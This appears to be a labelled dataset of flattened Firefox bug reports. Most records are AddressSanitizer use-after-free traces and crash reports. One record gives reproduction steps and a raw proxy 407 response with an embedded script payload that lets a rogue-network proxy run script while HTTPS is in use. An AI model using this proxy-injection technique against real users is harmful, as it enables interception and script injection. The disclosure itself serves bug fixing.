src/content/events/src/nseventdispatcher.cpp:313 28 in nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray nsidomeventtarget src/content/events/src/nseventdispatcher.cpp:629 29 in documentviewerimpl loadcomplete tag_nsresult src/layout/base/nsdocumentviewer.cpp:1024 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in ns_newhtmlinputelement already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/content/src/nshtmlinputelement.cpp:537 4 in createhtmlelement unsigned int already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/document/src/nshtmlcontentsink.cpp:497 5 in ns_newhtmlelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/document/src/nshtmlcontentsink.cpp:480 6 in ns_newelement nsicontent already_addrefed nsinodeinfo mozilla dom fromparser src/content/base/src/nsnamespacemanager.cpp:201 7 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent src/parser/html/nshtml5treeoperation.cpp:340 8 in nshtml5treeopexecutor runflushloop src/parser/html/nshtml5treeopexecutor.cpp:564 9 in nshtml5executorflusher run src/parser/html/nshtml5streamparser.cpp:127 10 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:612 11 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 12 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 13 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:208 14 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:201 15 in messageloop run src/ipc/chromium/src/base/message_loop.cc:175 16 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 17 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:290 18 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3782 19 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3848 20 in xre_main src/toolkit/xre/nsapprunner.cpp:3923 21 in do_main int char src/browser/app/nsbrowserapp.cpp:174 22 in main src/browser/app/nsbrowserapp.cpp:279 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 fb fb fb fb fb stats 254m malloced 296m for red zones by 516614 calls stats 42m realloced by 24355 calls stats 221m freed by 290089 calls stats 87m really freed by 207706 calls stats 484m 123993 full pages mmaped in 121 calls mmaps by size class 8:311277 9:32764 10:8190 11:14329 12:2048 13:1536 14:1280 15:384 16:1024 17:1248 18:144 19:40 20:28 mallocs by size class 8:448277 9:33777 10:8842 11:17027 12:2365 13:1758 14:1483 15:342 16:1199 17:1317 18:159 19:42 20:26 frees by size class 8:238380 9:24927 10:5659 11:13922 12:1543 13:1467 14:1292 15:301 16:1126 17:1300 18:110 19:39 20:23 rfrees by size class 8:184498 9:8844 10:2132 11:9156 12:663 13:494 14:464 15:181 16:934 17:311 18:24 19:4 20:1 stats malloc large 1544 small slow 2450 19969 aborting	11
https can be effectively disabled by attackers on rogue networks using a proxy that returns 407 with embedded script there appears to be a relatively nasty bug in your handling of https to reproduce set up a tcp server on say localhost:1234 and have it read the http request and respond with snip http/1.0 407 burp proxy-authenticate basic connection close content-type text/html html h1 pwnd h1 script alert location.href script some padding snip then configure localhost:1234 as a proxy for http and https on a rogue network this could be done through auto-discovery next have the victim navigate to a prompt will come up but doing the most reasonable thing dismissing it or hitting esc will display the html content returned by the proxy over plain text executing it in the context of	2
crash in mozilla net faildelaymanager lookup it s 114 top browser crasher in 16.0b5 and seems to happen only in beta versions with this signature 15.0 or 16.0 signature arena_dalloc_small je_free nsacstring_internal scalar deleting destructor unsigned int more reports search uuid c977c9fe-233d-4d8a-a1be-19ea42121004 date processed 2012-10-04 19:56:15 uptime 82347 last crash 22.9 hours before submission install age 4.4 days since version was first installed install time 2012-06-28 10:56:11 product firefox version 16.0 build id 20120925201946 release channel beta os windows nt os version 6.1.7600 build architecture x86 build architecture info genuineintel family 6 model 42 stepping 7 crash reason exception_breakpoint crash address app notes adaptervendorid adapterdeviceid adaptersubsysid 15ea10cf adapterdriverversion 8.15.10.2287 d2d d2d dwrite dwrite d3d10 layers d3d10 layers emcheckcompatibility true adapter vendor id adapter device id total virtual memory 2147352576 available virtual memory 1357484032 system memory use percentage 54 available page file 5218824192 available physical memory 1687126016 frame module signature source 0 mozglue.dll arena_dalloc_small memory/mozjemalloc/jemalloc.c:4510 1 mozglue.dll je_free memory/mozjemalloc/jemalloc.c:6565 2 xul.dll nsacstring_internal scalar deleting destructor 3 xul.dll mozilla net faildelaymanager lookup netwerk/protocol/websocket/websocketchannel.cpp:218 4 xul.dll mozilla net faildelaymanager delayorbegin netwerk/protocol/websocket/websocketchannel.cpp:229 5 xul.dll mozilla net nswsadmissionmanager conditionallyconnect netwerk/protocol/websocket/websocketchannel.cpp:339 6 xul.dll mozilla net websocketchannel onlookupcomplete netwerk/protocol/websocket/websocketchannel.cpp:2217 7 xul.dll anonymous namespace dnslistenerproxy onlookupcompleterunnable run netwerk/dns/nsdnsservice2.cpp:552 8 xul.dll nsthread processnextevent xpcom/threads/nsthread.cpp:624 9 xul.dll mozilla ipc messagepump run ipc/glue/messagepump.cpp:82 10 xul.dll messageloop runhandler ipc/chromium/src/base/message_loop.cc:201 11 xul.dll messageloop run ipc/chromium/src/base/message_loop.cc:175 12 xul.dll nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 13 xul.dll nsappshell run widget/windows/nsappshell.cpp:232 14 xul.dll nsappstartup run toolkit/components/startup/nsappstartup.cpp:257 15 xul.dll xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3794 16 xul.dll xremain xre_main toolkit/xre/nsapprunner.cpp:3871 17 xul.dll xre_main toolkit/xre/nsapprunner.cpp:3947 18 firefox.exe wmain toolkit/xre/nswindowswmain.cpp:100 19 firefox.exe tmaincrtstartup crtexe.c:552 20 kernel32.dll basethreadinitthunk 21 ntdll.dll rtluserthreadstart 22 ntdll.dll rtluserthreadstart more reports at je_free+|+nsacstring_internal 3a 3a 60scalar+deleting+destructor 27 27 28unsigned+int 29	11
xrays for new dom bindings need to filter properties based on their compartment right now we always expose chromeonly properties on xrays but we should only do that if the xray is in a chrome compartment we should probably do away with the dual property tables and have an additional flag in the table for chrome-only properties the prototype setup can decide based on the compartment whether to add those or not and the xray code can pass in the flag s required value based on the xray s compartment	2
heap-use-after-free in nsplaintexteditor fireclipboardevent reproduces on trunk need to press middle mouse scroll button to reproduce this 22895 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 1 at thread t0 0 in nsplaintexteditor fireclipboardevent int editor/libeditor/text/nsplaintexteditor.cpp:1156 1 in nshtmleditor paste int editor/libeditor/html/nshtmldatatransfer.cpp:1477 2 in nseditoreventlistener mouseclick nsidomevent editor/libeditor/base/nseditoreventlistener.cpp:559 3 in nshtmleditoreventlistener mouseclick nsidomevent editor/libeditor/html/nshtmleditoreventlistener.cpp:244 4 in nseditoreventlistener handleevent nsidomevent editor/libeditor/base/nseditoreventlistener.cpp:316 5 in nseventlistenermanager handleeventsubtype nslistenerstruct nsidomeventlistener nsidomevent nsidomeventtarget unsigned int nscxpusher content/events/src/nseventlistenermanager.cpp:869 6 in nseventlistenermanager handleeventinternal nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher content/events/src/nseventlistenermanager.cpp:942 7 in nseventlistenermanager handleevent nsprescontext nsevent nsidomevent nsidomeventtarget unsigned int nseventstatus nscxpusher content/events/src/nseventlistenermanager.h:143 8 in nseventtargetchainitem handleevent nseventchainpostvisitor unsigned int bool nscxpusher content/events/src/nseventdispatcher.cpp:182 9 in nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor unsigned int nsdispatchingcallback bool nscxpusher content/events/src/nseventdispatcher.cpp:283 10 in nseventdispatcher dispatch nsisupports nsprescontext nsevent nsidomevent nseventstatus nsdispatchingcallback nscomarray nsidomeventtarget content/events/src/nseventdispatcher.cpp:629 11 in presshell handleeventinternal nsevent nseventstatus layout/base/nspresshell.cpp:6437 12 in presshell handleeventwithtarget nsevent nsiframe nsicontent nseventstatus layout/base/nspresshell.cpp:6223 13 in nseventstatemanager checkforanddispatchclick nsprescontext nsmouseevent nseventstatus content/events/src/nseventstatemanager.cpp:4526 14 in nseventstatemanager posthandleevent nsprescontext nsevent nsiframe nseventstatus content/events/src/nseventstatemanager.cpp:3282 15 in presshell handleeventinternal nsevent nseventstatus layout/base/nspresshell.cpp:6462 16 in presshell handlepositionedevent nsiframe nsguievent nseventstatus layout/base/nspresshell.cpp:6208 17 in presshell handleevent nsiframe nsguievent bool nseventstatus layout/base/nspresshell.cpp:6007 18 in nsviewmanager dispatchevent nsguievent nsiview nseventstatus view/src/nsviewmanager.cpp:767 19 in nsview handleevent nsguievent bool view/src/nsview.cpp:1062 20 in non-virtual thunk to nsview handleevent nsguievent bool 21 in nswindow dispatchevent nsguievent nseventstatus widget/gtk2/nswindow.cpp:458 22 in nswindow onbuttonreleaseevent gtkwidget gdkeventbutton widget/gtk2/nswindow.cpp:2772 23 in button_release_event_cb gtkwidget gdkeventbutton widget/gtk2/nswindow.cpp:5270 24 in 0 is located 263 bytes inside of 824-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free memory/mozalloc/mozalloc.cpp:51 2 in operator delete void dist/include/mozilla/mozalloc.h:224 3 in nseditor release editor/libeditor/base/nseditor.cpp:211 4 in nshtmleditor release editor/libeditor/html/nshtmleditor.cpp:203 5 in nscomptr_base dist/include/nscomptr.h:408 6 in nscomptr nsieditor nscomptr dist/include/nscomptr.h:447 7 in nscomptr nsieditor nscomptr dist/include/nscomptr.h:447 8 in nseditingsession teardowneditoronwindow nsidomwindow editor/composer/src/nseditingsession.cpp:594 9 in nshtmldocument turneditingoff content/html/document/src/nshtmldocument.cpp:2588 10 in nshtmldocument editingstatechanged content/html/document/src/nshtmldocument.cpp:2637 11 in nshtmldocument maybeeditingstatechanged content/html/document/src/nshtmldocument.cpp:2342 12 in nshtmldocument endupdate unsigned int content/html/document/src/nshtmldocument.cpp:2355 13 in mozautodocupdate content/xul/templates/src base/src/mozautodocupdate.h:35 14 in mozautodocupdate content/xul/templates/src base/src/mozautodocupdate.h:33 15 in nsdocument resettouri nsiuri nsiloadgroup nsiprincipal content/base/src/nsdocument.cpp:2143 16 in nshtmldocument resettouri nsiuri nsiloadgroup nsiprincipal content/html/document/src/nshtmldocument.cpp:285 17 in nsdocument reset nsichannel nsiloadgroup content/base/src/nsdocument.cpp:2081 18 in nshtmldocument reset nsichannel nsiloadgroup content/html/document/src/nshtmldocument.cpp:272 19 in nshtmldocument open nsastring_internal const nsastring_internal const nsastring_internal const jscontext unsigned char nsisupports content/html/document/src/nshtmldocument.cpp:1525 20 in non-virtual thunk to nshtmldocument open nsastring_internal const nsastring_internal const nsastring_internal const jscontext unsigned char nsisupports 21 in ns_invokebyindex_p xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 22 in callmethodhelper invoke js/xpconnect/src/xpcwrappednative.cpp:3108 23 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1469 24 in js calljsnative jscontext int jscontext unsigned int js value js callargs const js/src/jscntxtinlines.h:364 25 in js interpret jscontext js stackframe js interpmode js/src/jsinterp.cpp:2461 26 in js runscript jscontext js handle jsscript js stackframe js/src/jsinterp.cpp:324 27 in js invokekernel jscontext js callargs js maybeconstruct js/src/jsinterp.cpp:378 28 in js invoke jscontext js invokeargsguard js maybeconstruct js/src/jsinterp.h:109 29 in js invoke jscontext js value const js value const unsigned int js value js value js/src/jsinterp.cpp:411 previously allocated by thread t0 here 0 in malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 2 in operator new unsigned long dist/include/mozilla/mozalloc.h:200 3 in mozilla genericfactory createinstance nsisupports nsid const void objdir-ff-asan-sym/xpcom/build/genericfactory.cpp:16 4 in nscomponentmanagerimpl createinstancebycontractid char const nsisupports nsid const void xpcom/components/nscomponentmanager.cpp:1006 5 in callcreateinstance char const nsisupports nsid const void objdir-ff-asan-sym/xpcom/build/nscomponentmanagerutils.cpp:135 6 in nscreateinstancebycontractid operator nsid const void const objdir-ff-asan-sym/xpcom/build/nscomponentmanagerutils.cpp:178 7 in nscomptr_base assign_from_helper nscomptr_helper const nsid const objdir-ff-asan-sym/xpcom/build/nscomptr.cpp:110 8 in nscomptr nsieditor operator nscomptr_helper const dist/include/nscomptr.h:689 9 in nseditingsession setupeditoronwindow nsidomwindow editor/composer/src/nseditingsession.cpp:423 10 in nseditingsession makewindoweditable nsidomwindow char const bool bool bool editor/composer/src/nseditingsession.cpp:173 11 in nshtmldocument editingstatechanged content/html/document/src/nshtmldocument.cpp:2696 12 in nshtmldocument maybeeditingstatechanged content/html/document/src/nshtmldocument.cpp:2342 13 in nshtmldocument endupdate unsigned int content/html/document/src/nshtmldocument.cpp:2355 14 in nshtml5treeopexecutor enddocupdate parser/html/nshtml5treeopexecutor.h:248 15 in nshtml5treeopexecutor didbuildmodel bool parser/html/nshtml5treeopexecutor.cpp:131 16 in nshtml5treeoperation perform nshtml5treeopexecutor nsicontent parser/html/nshtml5treeoperation.cpp:639 17 in nshtml5treeopexecutor runflushloop parser/html/nshtml5treeopexecutor.cpp:564 18 in nshtml5executorflusher run parser/html/nshtml5streamparser.cpp:127 19 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 20 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 21 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 22 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:208 23 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:201 24 in messageloop run ipc/chromium/src/base/message_loop.cc:175 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 250m malloced 292m for red zones by 500781 calls stats 42m realloced by 23522 calls stats 222m freed by 274938 calls stats 88m really freed by 188351 calls stats 476m 121944 full pages mmaped in 119 calls mmaps by size class 8:294894 9:32764 10:8190 11:14329 12:2048 13:1536 14:1280 15:256 16:1152 17:1280 18:128 19:40 20:20 mallocs by size class 8:434817 9:32109 10:8727 11:16263 12:2466 13:1715 14:1538 15:314 16:1299 17:1322 18:151 19:40 20:20 frees by size class 8:225151 9:23605 10:5504 11:13174 12:1615 13:1517 14:1380 15:265 16:1236 17:1305 18:132 19:37 20:17 rfrees by size class 8:165731 9:8622 10:2115 11:8698 12:626 13:552 14:481 15:146 16:1042 17:308 18:25 19:4 20:1 stats malloc large 1533 small slow 2447 22895 aborting	11
heap-use-after-free in nsdisplayboxshadowouter paint reproduces on trunk steps 1 visit 2 open print dialog using ctrl+p 3 select any printer and enter 6937 error addresssanitizer heap-use-after-free on address at pc bp sp write of size 1 at thread t0 0 in memcpy 1 in cairo_surface_snapshot_copy_on_write gfx/cairo/cairo/src/cairo-surface-snapshot.c:140 2 in nsdisplayboxshadowouter paint nsdisplaylistbuilder nsrenderingcontext layout/base/nsdisplaylist.cpp:2294 3 in mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void layout/base/framelayerbuilder.cpp:3238 4 in mozilla layers basicthebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basicthebeslayer.cpp:139 5 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:822 6 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 7 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:838 8 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 9 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:838 10 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 11 in mozilla layers basiclayermanager endtransactioninternal void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags gfx/layers/basic/basiclayermanager.cpp:589 12 in nsdisplaylist paintforframe nsdisplaylistbuilder nsrenderingcontext nsiframe unsigned int const layout/base/nsdisplaylist.cpp:1098 13 in nsdisplaylist paintroot nsdisplaylistbuilder nsrenderingcontext unsigned int const layout/base/nsdisplaylist.cpp:966 14 in nslayoututils paintframe nsrenderingcontext nsiframe nsregion const unsigned int unsigned int layout/base/nslayoututils.cpp:1835 15 in nssimplepagesequenceframe printnextpage layout/generic/nssimplepagesequence.cpp:763 16 in nsprintengine printpage nsprintobject bool layout/printing/nsprintengine.cpp:2824 17 in nspageprinttimer run layout/printing/nspageprinttimer.cpp:87 18 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 19 in ns_processnextevent_p nsithread bool objdir-ff-asan/xpcom/build/nsthreadutils.cpp:220 20 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 21 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:208 22 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 23 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3848 24 in xre_main toolkit/xre/nsapprunner.cpp:3923 25 in do_main int char browser/app/nsbrowserapp.cpp:174 26 in 0 is located 0 bytes inside of 6844-byte region freed by thread t0 here 0 in interceptor_free 1 in gfxalphaboxblur gfx/thebes/gfxblur.cpp:23 2 in nsdisplayboxshadowouter paint nsdisplaylistbuilder nsrenderingcontext layout/base/nsdisplaylist.cpp:2294 3 in mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void layout/base/framelayerbuilder.cpp:3238 4 in mozilla layers basicthebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basicthebeslayer.cpp:139 5 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:822 6 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 7 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:838 8 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 9 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:838 10 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 11 in mozilla layers basiclayermanager endtransactioninternal void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags gfx/layers/basic/basiclayermanager.cpp:589 12 in nsdisplaylist paintforframe nsdisplaylistbuilder nsrenderingcontext nsiframe unsigned int const layout/base/nsdisplaylist.cpp:1098 13 in nsdisplaylist paintroot nsdisplaylistbuilder nsrenderingcontext unsigned int const layout/base/nsdisplaylist.cpp:966 14 in nslayoututils paintframe nsrenderingcontext nsiframe nsregion const unsigned int unsigned int layout/base/nslayoututils.cpp:1835 15 in nssimplepagesequenceframe printnextpage layout/generic/nssimplepagesequence.cpp:763 16 in nsprintengine printpage nsprintobject bool layout/printing/nsprintengine.cpp:2824 17 in nspageprinttimer run layout/printing/nspageprinttimer.cpp:87 18 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 19 in ns_processnextevent_p nsithread bool objdir-ff-asan/xpcom/build/nsthreadutils.cpp:220 20 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 21 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:208 22 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 23 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3848 24 in xre_main toolkit/xre/nsapprunner.cpp:3923 25 in do_main int char browser/app/nsbrowserapp.cpp:174 26 in 0 previously allocated by thread t0 here 0 in malloc 1 in alphaboxblur gfx/2d/blur.cpp:384 2 in gfxalphaboxblur init gfxrect const nsintsize const nsintsize const gfxrect const gfxrect const gfx/thebes/gfxblur.cpp:52 3 in nscontextboxblur init nsrect const int int int gfxcontext nsrect const gfxrect const unsigned int layout/base/nscssrendering.cpp:4559 4 in nscssrendering paintboxshadowouter nsprescontext nsrenderingcontext nsiframe nsrect const nsrect const layout/base/nscssrendering.cpp:1244 5 in nsdisplayboxshadowouter paint nsdisplaylistbuilder nsrenderingcontext layout/base/nsdisplaylist.cpp:2294 6 in mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void layout/base/framelayerbuilder.cpp:3238 7 in mozilla layers basicthebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basicthebeslayer.cpp:139 8 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:822 9 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 10 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:838 11 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 12 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext gfx/layers/basic/basiclayermanager.cpp:838 13 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor gfx/layers/basic/basiclayermanager.cpp:931 14 in mozilla layers basiclayermanager endtransactioninternal void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags gfx/layers/basic/basiclayermanager.cpp:589 15 in nsdisplaylist paintforframe nsdisplaylistbuilder nsrenderingcontext nsiframe unsigned int const layout/base/nsdisplaylist.cpp:1098 16 in nsdisplaylist paintroot nsdisplaylistbuilder nsrenderingcontext unsigned int const layout/base/nsdisplaylist.cpp:966 17 in nslayoututils paintframe nsrenderingcontext nsiframe nsregion const unsigned int unsigned int layout/base/nslayoututils.cpp:1835 18 in nssimplepagesequenceframe printnextpage layout/generic/nssimplepagesequence.cpp:763 19 in nsprintengine printpage nsprintobject bool layout/printing/nsprintengine.cpp:2824 20 in nspageprinttimer run layout/printing/nspageprinttimer.cpp:87 21 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 22 in ns_processnextevent_p nsithread bool objdir-ff-asan/xpcom/build/nsthreadutils.cpp:220 23 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:82 24 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:208 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd stats 905m malloced 979m for red zones by 1833862 calls stats 105m realloced by 83665 calls stats 837m freed by 1481377 calls stats 699m really freed by 1274702 calls stats 868m 222350 full pages mmaped in 215 calls mmaps by size class 8:770001 9:65528 10:32760 11:20470 12:8192 13:6144 14:1792 15:640 16:1216 17:1248 18:336 19:56 20:24 21:22 22:5 23:2 mallocs by size class 8:1485067 9:165298 10:82797 11:55504 12:19877 13:11914 14:5299 15:1882 16:2399 17:2909 18:653 19:160 20:55 21:38 22:7 23:3 frees by size class 8:1168626 9:145581 10:75352 11:50174 12:17771 13:11299 14:4892 15:1747 16:2233 17:2853 18:596 19:155 20:53 21:37 22:6 23:2 rfrees by size class 8:1006654 9:124075 10:64219 11:44235 12:14331 13:10277 14:4368 15:1477 16:1972 17:2358 18:550 19:108 20:45 21:27 22:5 23:1 stats malloc large 3825 small slow 8875 6937 aborting	11
heap-use-after-free in gfxfont getfontentry reproduces on trunk let the simple testcase run for like 2-5 min to see it crash automatically and reliably 6069 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsrefptr gfxfontentry get const dist/include/nsautoptr.h:1003 1 in gfxfont getfontentry dist/include/gfxfont.h:1497 2 in gfxfontcache hashentry keyequals gfxfontcache key const const gfx/thebes/gfxfont.cpp:1255 3 in nsthashtable gfxfontcache hashentry s_matchentry pldhashtable pldhashentryhdr const void const dist/include/nsthashtable.h:440 4 in searchtable pldhashtable void const unsigned int pldhashoperator objdir-ff-asan-sym/xpcom/build/pldhash.cpp:434 5 in pl_dhashtableoperate objdir-ff-asan-sym/xpcom/build/pldhash.cpp:587 6 in nsthashtable gfxfontcache hashentry getentry gfxfontcache key const const dist/include/nsthashtable.h:147 7 in gfxfontcache destroyfont gfxfont gfx/thebes/gfxfont.cpp:1321 8 in gfxfontcache notifyexpired gfxfont gfx/thebes/gfxfont.cpp:1314 9 in nsexpirationtracker gfxfont 3u ageonegeneration dist/include/nsexpirationtracker.h:188 10 in nsexpirationtracker gfxfont 3u timercallback nsitimer void dist/include/nsexpirationtracker.h:311 11 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:473 12 in nstimerevent run xpcom/threads/nstimerimpl.cpp:556 13 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 14 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 15 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:117 16 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:208 17 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:201 18 in messageloop run ipc/chromium/src/base/message_loop.cc:175 19 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 20 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:290 21 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3782 22 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3848 23 in xre_main toolkit/xre/nsapprunner.cpp:3923 24 in do_main int char browser/app/nsbrowserapp.cpp:174 25 in main browser/app/nsbrowserapp.cpp:279 26 in 0 is located 24 bytes inside of 392-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free memory/mozalloc/mozalloc.cpp:51 2 in operator delete void dist/include/mozilla/mozalloc.h:224 3 in gfxfontcache destroyfont gfxfont gfx/thebes/gfxfont.cpp:1326 4 in gfxfontcache notifyexpired gfxfont gfx/thebes/gfxfont.cpp:1314 5 in nsexpirationtracker gfxfont 3u ageonegeneration dist/include/nsexpirationtracker.h:188 6 in nsexpirationtracker gfxfont 3u timercallback nsitimer void dist/include/nsexpirationtracker.h:311 7 in nstimerimpl fire xpcom/threads/nstimerimpl.cpp:473 8 in nstimerevent run xpcom/threads/nstimerimpl.cpp:556 9 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:612 10 in ns_processnextevent_p nsithread bool objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:220 11 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:117 12 in messageloop runinternal ipc/chromium/src/base/message_loop.cc:208 13 in messageloop runhandler ipc/chromium/src/base/message_loop.cc:201 14 in messageloop run ipc/chromium/src/base/message_loop.cc:175 15 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:163 16 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:290 17 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:3782 18 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:3848 19 in xre_main toolkit/xre/nsapprunner.cpp:3923 20 in do_main int char browser/app/nsbrowserapp.cpp:174 21 in main browser/app/nsbrowserapp.cpp:279 22 in 0 previously allocated by thread t0 here 0 in malloc 1 in 